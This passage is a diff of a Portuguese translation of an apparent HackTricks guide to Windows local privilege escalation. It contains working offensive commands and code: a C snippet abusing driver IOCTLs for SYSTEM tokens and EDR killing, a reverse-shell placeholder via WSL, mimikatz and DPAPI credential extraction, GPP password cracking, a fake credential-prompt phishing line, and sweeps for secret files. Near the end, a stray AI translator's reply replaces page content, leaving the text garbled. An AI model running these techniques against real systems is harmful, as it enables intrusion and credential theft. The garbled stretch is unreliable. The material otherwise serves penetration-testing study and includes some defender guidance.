+Windows permite que usuários especifiquem ações a serem tomadas caso um serviço falhe. Esse recurso pode ser configurado para apontar para um binary. Se esse binary for substituível, privilege escalation pode ser possível. Mais detalhes podem ser encontrados na [documentação oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
 
 ## Aplicações
 
 ### Aplicações Instaladas
 
-Verifique as **permissões dos binaries** (talvez você consiga sobrescrever um e realizar privilege escalation) e das **pastas** ([DLL Hijacking](dll-hijacking/index.html)).
+Verifique as **permissões dos binaries** (talvez você consiga sobrescrever um e escalate privileges) e das **pastas** ([DLL Hijacking](dll-hijacking/index.html)).
 ```bash
 dir /a "C:\Program Files"
 dir /a "C:\Program Files (x86)"
@@ -598,11 +598,11 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE
 Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
-### Permissões de Escrita
+### Permissões de escrita
 
 Verifique se você pode modificar algum arquivo de configuração para ler algum arquivo especial ou se pode modificar algum binário que será executado por uma conta Administrator (schedtasks).
 
-Uma maneira de encontrar permissões fracas de pastas/arquivos no sistema é executar:
+Uma forma de encontrar permissões fracas em pastas/arquivos no sistema é fazendo:
 ```bash
 accesschk.exe /accepteula
 # Find all weak folder permissions per drive.
@@ -627,8 +627,8 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 ```
 ### Executar na inicialização
 
-**Verifique se você pode sobrescrever algum registry ou binary que será executado por outro usuário.**\
-**Leia** a **página a seguir** para saber mais sobre **autoruns locations interessantes para escalar privilégios**:
+**Verifique se consegue sobrescrever algum registry ou binary que será executado por um usuário diferente.**\
+**Leia** a **página a seguir** para aprender mais sobre locais interessantes de **autoruns** para **escalate privileges**:
 
 
 {{#ref}}
@@ -637,29 +637,29 @@ privilege-escalation-with-autorun-binaries.md
 
 ### Drivers
 
-Procure possíveis **drivers de terceiros estranhos/vulneráveis**
+Procure por possíveis **third party weird/vulnerable** drivers
 ```bash
 driverquery
 driverquery.exe /fo table
 driverquery /SI
 ```
-Se um driver expõe uma primitiva arbitrária de leitura/gravação do kernel (comum em handlers IOCTL mal projetados), você pode escalar privilégios roubando um token SYSTEM diretamente da memória do kernel. Veja a técnica passo a passo aqui:
+Se um driver expõe uma primitiva de leitura/escrita arbitrária do kernel (comum em manipuladores IOCTL mal projetados), você pode escalar privilegiost roubando um token SYSTEM diretamente da memória do kernel. Veja a técnica passo a passo aqui:
 
 {{#ref}}
 arbitrary-kernel-rw-token-theft.md
 {{#endref}}
 
-#### Abuso da ausência de FILE_DEVICE_SECURE_OPEN em objetos de dispositivo (LPE + EDR kill)
+#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)
 
-Alguns drivers de terceiros assinados criam seu objeto de dispositivo com um SDDL forte via IoCreateDeviceSecure, mas esquecem de definir FILE_DEVICE_SECURE_OPEN em DeviceCharacteristics. Sem essa flag, a DACL segura não é aplicada quando o dispositivo é aberto por um caminho que contenha um componente extra, permitindo que qualquer usuário sem privilégios obtenha um handle usando um caminho de namespace como:
+Alguns drivers de terceiros assinados criam seu objeto de dispositivo com um SDDL forte via IoCreateDeviceSecure mas esquecem de setar FILE_DEVICE_SECURE_OPEN em DeviceCharacteristics. Sem essa flag, a DACL segura não é aplicada quando o dispositivo é aberto através de um caminho que contenha um componente extra, permitindo que qualquer usuário não privilegiado obtenha um handle usando um caminho de namespace como:
 
 - \\ .\\DeviceName\\anything
 - \\ .\\amsdk\\anyfile (from a real-world case)
 
-Uma vez que um usuário consegue abrir o dispositivo, IOCTLs privilegiados expostos pelo driver podem ser abusados para LPE e manipulação. Capacidades de exemplo observadas na prática:
-- Retornar handles com acesso total para processos arbitrários (token theft / shell SYSTEM via DuplicateTokenEx/CreateProcessAsUser).
-- Leitura/gravação raw de disco sem restrições (manipulação offline, truques de persistência no boot).
-- Encerrar processos arbitrários, incluindo Protected Process/Light (PP/PPL), permitindo AV/EDR kill a partir do user land via kernel.
+Uma vez que um usuário consegue abrir o dispositivo, IOCTLs privilegiados expostos pelo driver podem ser abusados para LPE e manipulação. Capacidades observadas na prática:
+- Retornar handles com acesso total para processos arbitrários (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
+- Leitura/escrita raw de disco sem restrições (offline tampering, truques de persistência no boot).
+- Terminar processos arbitrários, incluindo Protected Process/Light (PP/PPL), permitindo matar AV/EDR a partir do user land via kernel.
 
 Padrão mínimo de PoC (user mode):
 ```c
@@ -674,20 +674,20 @@ DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0)
 DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
 ```
 Mitigações para desenvolvedores
-- Sempre defina FILE_DEVICE_SECURE_OPEN ao criar objetos de dispositivo destinados a ser restritos por um DACL.
-- Valide o contexto do chamador para operações privilegiadas. Adicione verificações PP/PPL antes de permitir o encerramento de processos ou o retorno de handles.
-- Restringa IOCTLs (access masks, METHOD_*, validação de entrada) e considere modelos intermediados em vez de privilégios diretos no kernel.
+- Sempre defina FILE_DEVICE_SECURE_OPEN ao criar device objects destinados a serem restritos por um DACL.
+- Valide o contexto do chamador para operações privilegiadas. Adicione checagens PP/PPL antes de permitir o término de processos ou o retorno de handles.
+- Restrinja IOCTLs (access masks, METHOD_*, input validation) e considere brokered models em vez de privilégios diretos no kernel.
 
-Detecção — ideias para defensores
-- Monitore aberturas em user-mode de nomes de dispositivos suspeitos (e.g., \\ .\\amsdk*) e sequências específicas de IOCTL indicativas de abuso.
-- Aplique a blocklist de drivers vulneráveis da Microsoft (HVCI/WDAC/Smart App Control) e mantenha suas próprias listas de permissão/negação.
+Detection ideas for defenders
+- Monitore aberturas em user-mode de nomes de dispositivo suspeitos (e.g., \\ .\\amsdk*) e sequências específicas de IOCTL indicativas de abuso.
+- Aplique a blocklist de drivers vulneráveis da Microsoft (HVCI/WDAC/Smart App Control) e mantenha suas próprias listas de allow/deny.
 
 
 ## PATH DLL Hijacking
 
-Se você tem **permissões de escrita dentro de uma pasta presente em PATH** você poderia conseguir hijack a DLL carregada por um processo e **escalate privileges**.
+Se você tiver **write permissions inside a folder present on PATH** pode ser capaz de hijack a DLL carregada por um processo e **escalate privileges**.
 
-Verifique as permissões de todas as pastas dentro de PATH:
+Verifique as permissões de todas as pastas dentro do PATH:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
@@ -708,9 +708,9 @@ net view \\computer /ALL #List shares of a computer
 net use x: \\computer\share #Mount the share locally
 net share #Check current shares
 ```
-### arquivo hosts
+### hosts file
 
-Verifique se há outros computadores conhecidos hardcoded no arquivo hosts
+Verifique se há outros computadores conhecidos hardcoded no hosts file
 ```
 type C:\Windows\System32\drivers\etc\hosts
 ```
@@ -722,7 +722,7 @@ Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 ```
 ### Portas Abertas
 
-Verifique a existência de **serviços restritos** acessíveis externamente.
+Verifique se há **serviços restritos** acessíveis externamente
 ```bash
 netstat -ano #Opened ports?
 ```
@@ -736,11 +736,11 @@ Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIn
 arp -A
 Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
 ```
-### Regras de Firewall
+### Firewall Rules
 
-[**Confira esta página para comandos relacionados ao Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar regras, criar regras, desativar, desativar...)**
+[**Consulte esta página para comandos relacionados ao Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar regras, criar regras, desativar, desativar...)**
 
-Mais[ comandos para enumeração de rede aqui](../basic-cmd-for-pentesters.md#network)
+Mais [comandos para enumeração de rede aqui](../basic-cmd-for-pentesters.md#network)
 
 ### Windows Subsystem for Linux (wsl)
 ```bash
@@ -749,7 +749,7 @@ C:\Windows\System32\wsl.exe
 ```
 O binário `bash.exe` também pode ser encontrado em `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`
 
-Se você conseguir o usuário root, pode escutar em qualquer porta (na primeira vez que você usar `nc.exe` para escutar em uma porta, ele perguntará via GUI se `nc` deve ser permitido pelo firewall).
+Se você obtiver o usuário root, pode escutar em qualquer porta (na primeira vez que você usar `nc.exe` para escutar em uma porta, ele perguntará via GUI se `nc` deve ser permitido pelo firewall).
 ```bash
 wsl whoami
 ./ubuntun1604.exe config --default-user root
@@ -758,7 +758,7 @@ wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
 ```
 Para iniciar facilmente o bash como root, você pode tentar `--default-user root`
 
-Você pode explorar o `WSL` filesystem na pasta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
+Você pode explorar o sistema de arquivos do `WSL` na pasta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
 
 ## Credenciais do Windows
 
@@ -774,14 +774,14 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDef
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
 ```
-### Credentials manager / Windows vault
+### Gerenciador de credenciais / Windows Vault
 
 From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
-O Windows Vault armazena credenciais de usuário para servidores, websites e outros programas que **Windows** pode **efetuar o login automático dos usuários**. A princípio, isso pode parecer que os usuários podem armazenar suas credenciais do Facebook, Twitter, Gmail etc., para que façam login automaticamente via navegadores. Mas não é assim.
+O Windows Vault armazena credenciais de usuário para servidores, websites e outros programas nos quais o **Windows** pode efetuar o login dos usuários automaticamente. À primeira vista, isso pode parecer que os usuários podem armazenar suas credenciais do Facebook, Twitter, Gmail etc., para que façam login automaticamente via navegadores. Mas não é assim.
 
-O Windows Vault armazena credenciais que o Windows pode usar para efetuar o login automático dos usuários, o que significa que qualquer **Windows application that needs credentials to access a resource** (servidor ou um website) **can make use of this Credential Manager** & Windows Vault e usar as credenciais fornecidas em vez de os usuários digitarem o nome de usuário e a senha o tempo todo.
+O Windows Vault armazena credenciais que o Windows pode usar para efetuar o login dos usuários automaticamente, o que significa que qualquer **aplicativo Windows que precise de credenciais para acessar um recurso** (servidor ou um website) **pode fazer uso deste Credential Manager** e do Windows Vault e utilizar as credenciais fornecidas em vez de os usuários digitarem o nome de usuário e a senha o tempo todo.
 
-A menos que as aplicações interajam com Credential Manager, não acredito que seja possível para elas usarem as credenciais para um dado recurso. Portanto, se sua aplicação quiser fazer uso do vault, ela deve de alguma forma **comunicar-se com o credential manager e solicitar as credenciais para esse recurso** do cofre de armazenamento padrão.
+A menos que os aplicativos interajam com o Credential Manager, não acho que seja possível que eles usem as credenciais para um determinado recurso. Portanto, se seu aplicativo quiser usar o cofre, ele deve de alguma forma **comunicar-se com o Credential Manager e solicitar as credenciais para esse recurso** do cofre de armazenamento padrão.
 
 Use o `cmdkey` para listar as credenciais armazenadas na máquina.
 ```bash
@@ -803,25 +803,27 @@ Observe que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/util
 
 ### DPAPI
 
-The **Data Protection API (DPAPI)** provides a method for symmetric encryption of data, predominantly used within the Windows operating system for the symmetric encryption of asymmetric private keys. This encryption leverages a user or system secret to significantly contribute to entropy.
+A **Data Protection API (DPAPI)** fornece um método para criptografia simétrica de dados, predominantemente usado no sistema operacional Windows para a criptografia simétrica de chaves privadas assimétricas. Essa criptografia utiliza um segredo do usuário ou do sistema para contribuir significativamente para a entropia.
 
-**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. In scenarios involving system encryption, it utilizes the system's domain authentication secrets.
+**DPAPI permite a criptografia de chaves por meio de uma chave simétrica derivada dos segredos de login do usuário**. Em cenários envolvendo criptografia do sistema, ela utiliza os segredos de autenticação de domínio do sistema.
 
-Encrypted user RSA keys, by using DPAPI, are stored in the `%APPDATA%\Microsoft\Protect\{SID}` directory, where `{SID}` represents the user's [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **A chave DPAPI, co-localizada com a chave mestra que protege as chaves privadas do usuário no mesmo arquivo**, tipicamente consiste em 64 bytes de dados aleatórios. (É importante notar que o acesso a esse diretório é restrito, impedindo listar seu conteúdo via o comando `dir` no CMD, embora possa ser listado através do PowerShell).
+Chaves RSA de usuário criptografadas, ao usar o DPAPI, são armazenadas no diretório `%APPDATA%\Microsoft\Protect\{SID}`, onde `{SID}` representa o [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) do usuário. **A chave DPAPI, co-localizada com a chave mestra que protege as chaves privadas do usuário no mesmo arquivo**, normalmente consiste em 64 bytes de dados aleatórios. (É importante notar que o acesso a esse diretório é restrito, impedindo listar seu conteúdo via o comando `dir` no CMD, embora possa ser listado através do PowerShell).
 ```bash
 Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
 Você pode usar o **mimikatz module** `dpapi::masterkey` com os argumentos apropriados (`/pvk` ou `/rpc`) para descriptografá-lo.
 
-Os **credentials files protected by the master password** geralmente estão localizados em:
+Os **arquivos de credenciais protegidos pela senha mestra** geralmente estão localizados em:
 ```bash
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-Você pode usar **mimikatz module** `dpapi::cred` com o `/masterkey` apropriado para descriptografar.\ Você pode **extrair muitos DPAPI** **masterkeys** da **memória** com o módulo `sekurlsa::dpapi` (se você for root).
+Você pode usar **mimikatz module** `dpapi::cred` com o `/masterkey` apropriado para descriptografar.\
+Você pode **extrair muitas DPAPI** **masterkeys** da **memória** com o módulo `sekurlsa::dpapi` (se você for root).
+
 
 {{#ref}}
 dpapi-extracting-passwords.md
@@ -829,7 +831,7 @@ dpapi-extracting-passwords.md
 
 ### Credenciais do PowerShell
 
-**Credenciais do PowerShell** são frequentemente usadas para tarefas de **scripting** e automação como uma forma conveniente de armazenar credenciais criptografadas. As credenciais são protegidas usando **DPAPI**, o que normalmente significa que só podem ser descriptografadas pelo mesmo usuário no mesmo computador em que foram criadas.
+**PowerShell credentials** são frequentemente usadas para tarefas de **scripting** e automação como uma forma conveniente de armazenar credenciais criptografadas. As credenciais são protegidas usando **DPAPI**, o que normalmente significa que só podem ser descriptografadas pelo mesmo usuário no mesmo computador em que foram criadas.
 
 Para **descriptografar** uma credencial do PS a partir do arquivo que a contém, você pode fazer:
 ```bash
@@ -842,7 +844,7 @@ PS C:\htb> $credential.GetNetworkCredential().password
 
 JustAPWD!
 ```
-### Wifi
+### Wi-Fi
 ```bash
 #List saved Wifi using
 netsh wlan show profile
@@ -856,7 +858,7 @@ cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| 
 Você pode encontrá-las em `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
 e em `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
 
-### Comandos executados recentemente
+### Comandos Executados Recentemente
 ```
 HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
@@ -865,18 +867,18 @@ HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 ```
 %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
 ```
-Use o módulo `dpapi::rdg` do **Mimikatz** com o `/masterkey` apropriado para **descriptografar quaisquer arquivos .rdg`\
-Você pode **extrair muitos DPAPI masterkeys** da memória com o módulo `sekurlsa::dpapi` do **Mimikatz**
+Use o módulo `dpapi::rdg` do **Mimikatz** com o `/masterkey` apropriado para **descriptografar quaisquer arquivos .rdg**\
+Você pode **extrair muitas DPAPI masterkeys** da memória com o módulo `sekurlsa::dpapi` do **Mimikatz**
 
 ### Sticky Notes
 
-Frequentemente as pessoas usam o aplicativo StickyNotes em estações de trabalho Windows para **salvar senhas** e outras informações, sem perceber que é um arquivo de banco de dados. Esse arquivo está localizado em `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` e sempre vale a pena procurá-lo e examiná-lo.
+Pessoas frequentemente usam o app StickyNotes em estações de trabalho Windows para **salvar senhas** e outras informações, sem perceber que é um arquivo de banco de dados. Este arquivo está localizado em `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` e vale sempre a pena procurá-lo e examiná-lo.
 
 ### AppCmd.exe
 
-**Observe que, para recuperar senhas do AppCmd.exe, você precisa ser Administrador e executar com nível de integridade alto.**\
+**Observe que, para recuperar senhas do AppCmd.exe, você precisa ser Administrador e executar em um nível de alta integridade.**\
 **AppCmd.exe** está localizado no diretório `%systemroot%\system32\inetsrv\`.\  
-Se esse arquivo existir, é possível que algumas **credenciais** tenham sido configuradas e possam ser **recuperadas**.
+Se este arquivo existir, é possível que algumas **credentials** tenham sido configuradas e possam ser **recuperadas**.
 
 Este código foi extraído de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
 ```bash
@@ -959,7 +961,7 @@ $ErrorActionPreference = $OrigError
 ### SCClient / SCCM
 
 Verifique se `C:\Windows\CCM\SCClient.exe` existe .\
-Instaladores são **executados com privilégios SYSTEM**, muitos são vulneráveis a **DLL Sideloading (Info de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
+Instaladores são **executados com privilégios SYSTEM**, muitos são vulneráveis a **DLL Sideloading (Informações de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
 ```bash
 $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
 if ($result) { $result }
@@ -967,29 +969,29 @@ else { Write "Not Installed." }
 ```
 ## Arquivos e Registro (Credenciais)
 
-### Putty Creds
+### Putty Credenciais
 ```bash
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
 ```
-### Putty Chaves SSH do Host
+### Chaves de host SSH do Putty
 ```
 reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
 ```
 ### Chaves SSH no registro
 
-Chaves privadas SSH podem ser armazenadas dentro da chave de registro `HKCU\Software\OpenSSH\Agent\Keys`, portanto você deve verificar se há algo interessante lá:
+Chaves privadas SSH podem ser armazenadas na chave de registro `HKCU\Software\OpenSSH\Agent\Keys`, então você deve verificar se há algo interessante lá:
 ```bash
 reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
 ```
-Se encontrar alguma entrada dentro desse caminho, provavelmente será uma SSH key salva. Ela está armazenada criptografada, mas pode ser facilmente descriptografada usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
+Se você encontrar qualquer entrada dentro desse caminho, provavelmente será uma chave SSH salva. Ela é armazenada criptografada, mas pode ser facilmente descriptografada usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
 Mais informações sobre esta técnica aqui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
-Se o serviço `ssh-agent` não estiver em execução e você quiser que ele inicie automaticamente na inicialização, execute:
+Se o serviço `ssh-agent` não estiver em execução e você quiser que ele inicie automaticamente no boot, execute:
 ```bash
 Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
 ```
 > [!TIP]
-> Parece que esta técnica não é mais válida. Tentei criar algumas ssh keys, adicioná-las com `ssh-add` e fazer login via ssh em uma máquina. O registro HKCU\Software\OpenSSH\Agent\Keys não existe e o procmon não identificou o uso de `dpapi.dll` durante a autenticação por chave assimétrica.
+> Parece que essa técnica não é mais válida. Tentei criar algumas ssh keys, adicioná-las com `ssh-add` e fazer login via ssh em uma máquina. O registro HKCU\Software\OpenSSH\Agent\Keys não existe e o procmon não identificou o uso de `dpapi.dll` durante a autenticação por chave assimétrica.
 
 ### Arquivos desatendidos
 ```
@@ -1006,7 +1008,7 @@ C:\unattend.txt
 C:\unattend.inf
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 ```
-Você também pode procurar esses arquivos usando **metasploit**: _post/windows/gather/enum_unattend_
+Você também pode procurar por esses arquivos usando **metasploit**: _post/windows/gather/enum_unattend_
 
 Conteúdo de exemplo:
 ```xml
@@ -1027,7 +1029,7 @@ Conteúdo de exemplo:
 </LocalAccounts>
 </UserAccounts>
 ```
-### Backups do SAM & SYSTEM
+### Cópias de segurança do SAM e do SYSTEM
 ```bash
 # Usually %SYSTEMROOT% = C:\Windows
 %SYSTEMROOT%\repair\SAM
@@ -1037,7 +1039,7 @@ Conteúdo de exemplo:
 %SYSTEMROOT%\System32\config\SYSTEM
 %SYSTEMROOT%\System32\config\RegBack\system
 ```
-### Credenciais na Nuvem
+### Credenciais de Nuvem
 ```bash
 #From user home
 .aws\credentials
@@ -1049,11 +1051,13 @@ AppData\Roaming\gcloud\access_tokens.db
 ```
 ### McAfee SiteList.xml
 
+Procure por um arquivo chamado **SiteList.xml**
+
 ### Senha GPP em cache
 
-Uma funcionalidade anteriormente disponível permitia a implantação de contas locais de administrador personalizadas em um conjunto de máquinas via Group Policy Preferences (GPP). Entretanto, esse método apresentava falhas de segurança significativas. Primeiro, os Group Policy Objects (GPOs), armazenados como arquivos XML em SYSVOL, podiam ser acessados por qualquer usuário do domínio. Segundo, as senhas dentro desses GPPs, criptografadas com AES256 usando uma chave padrão documentada publicamente, podiam ser descriptografadas por qualquer usuário autenticado. Isso representava um risco sério, pois poderia permitir que usuários obtivessem privilégios elevados.
+Uma funcionalidade estava disponível anteriormente que permitia a implantação de contas de administrador local personalizadas em um grupo de máquinas via Group Policy Preferences (GPP). No entanto, esse método apresentava falhas de segurança significativas. Primeiro, os Group Policy Objects (GPOs), armazenados como arquivos XML em SYSVOL, podiam ser acessados por qualquer usuário do domínio. Segundo, as senhas dentro desses GPPs, criptografadas com AES256 usando uma chave padrão documentada publicamente, podiam ser descriptografadas por qualquer usuário autenticado. Isso representava um risco sério, pois poderia permitir que usuários obtivessem privilégios elevados.
 
-Para mitigar esse risco, foi desenvolvida uma função para escanear arquivos GPP armazenados localmente em cache que contenham um campo "cpassword" que não esteja vazio. Ao encontrar tal arquivo, a função descriptografa a senha e retorna um objeto PowerShell personalizado. Esse objeto inclui detalhes sobre o GPP e a localização do arquivo, auxiliando na identificação e correção dessa vulnerabilidade de segurança.
+Para mitigar esse risco, foi desenvolvida uma função para escanear arquivos GPP em cache local que contenham um campo "cpassword" que não esteja vazio. Ao encontrar tal arquivo, a função descriptografa a senha e retorna um objeto PowerShell personalizado. Esse objeto inclui detalhes sobre o GPP e a localização do arquivo, auxiliando na identificação e na correção dessa vulnerabilidade de segurança.
 
 Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior ao W Vista)_ for these files:
 
@@ -1073,7 +1077,7 @@ Usando crackmapexec para obter as senhas:
 ```bash
 crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
 ```
-### IIS Web Config
+### Configuração Web do IIS
 ```bash
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
@@ -1117,7 +1121,7 @@ $entropy,
 Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
 }
 ```
-### Logs
+### Registros
 ```bash
 # IIS
 C:\inetpub\logs\LogFiles\*
@@ -1125,9 +1129,9 @@ C:\inetpub\logs\LogFiles\*
 #Apache
 Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
 ```
-### Peça credenciais
+### Pedir credentials
 
-Você pode sempre **pedir ao usuário para inserir suas credenciais ou até as credenciais de outro usuário** se achar que ele pode conhecê‑las (observe que **pedir** diretamente ao cliente pelas **credenciais** é realmente **arriscado**):
+Você pode sempre **pedir ao usuário que insira suas credentials ou mesmo as credentials de outro usuário** se você achar que ele pode conhecê-las (observe que **pedir** diretamente ao cliente pelas **credentials** é realmente **arriscado**):
 ```bash
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
@@ -1201,7 +1205,7 @@ TypedURLs       #IE
 %USERPROFILE%\ntuser.dat
 %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
 ```
-Não tenho acesso ao seu sistema de arquivos. Por favor, cole aqui o conteúdo do arquivo src/windows-hardening/windows-local-privilege-escalation/README.md (ou envie os arquivos propostos) e eu farei a tradução para português mantendo exatamente a mesma sintaxe Markdown/HTML e as exceções que você indicou. Quer que eu traduza todo o arquivo ou apenas seções específicas?
+Não tenho acesso ao seu sistema de arquivos para "procurar" os arquivos. Por favor, cole o conteúdo de src/windows-hardening/windows-local-privilege-escalation/README.md (ou envie os arquivos que quer que eu traduza). Se quiser que eu procure/traduza vários arquivos, forneça a lista de caminhos ou compacte e envie-os. Vou então traduzir o texto relevante para português mantendo exatamente a mesma sintaxe Markdown/HTML e sem traduzir código, links, tags ou caminhos.
 ```
 cd C:\
 dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
@@ -1212,7 +1216,7 @@ Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAct
 ```
 ### Credenciais na Lixeira
 
-Você também deve verificar a Lixeira em busca de credenciais.
+Você também deve verificar a lixeira em busca de credenciais.
 
 Para **recuperar senhas** salvas por vários programas você pode usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
 
@@ -1229,10 +1233,10 @@ reg query "HKCU\Software\OpenSSH\Agent\Key"
 
 ### Histórico dos navegadores
 
-Você deve procurar por dbs onde senhas do **Chrome or Firefox** são armazenadas.  
-Também verifique o histórico, bookmarks e favoritos dos navegadores, pois talvez algumas **senhas estejam** armazenadas lá.
+Você deve procurar por dbs onde senhas do **Chrome ou Firefox** são armazenadas.\
+Também verifique o histórico, bookmarks e favoritos dos navegadores, pois talvez algumas **senhas** estejam armazenadas lá.
 
-Ferramentas para extrair senhas dos navegadores:
+Tools to extract passwords from browsers:
 
 - Mimikatz: `dpapi::chrome`
 - [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
@@ -1241,24 +1245,24 @@ Ferramentas para extrair senhas dos navegadores:
 
 ### **COM DLL Overwriting**
 
-**Component Object Model (COM)** é uma tecnologia integrada ao sistema operacional Windows que permite a **intercomunicação** entre componentes de software de diferentes linguagens. Cada componente COM é **identificado via um class ID (CLSID)** e cada componente expõe funcionalidade por meio de uma ou mais interfaces, identificadas via interface IDs (IIDs).
+**Component Object Model (COM)** é uma tecnologia integrada ao sistema operacional Windows que permite a **intercomunicação** entre componentes de software escritos em diferentes linguagens. Cada componente COM é **identificado via um class ID (CLSID)** e cada componente expõe funcionalidade via uma ou mais interfaces, identificadas via interface IDs (IIDs).
 
-As classes e interfaces COM são definidas no registro sob **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface**, respectivamente. Esse registro é criado pela mesclagem de **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT**.
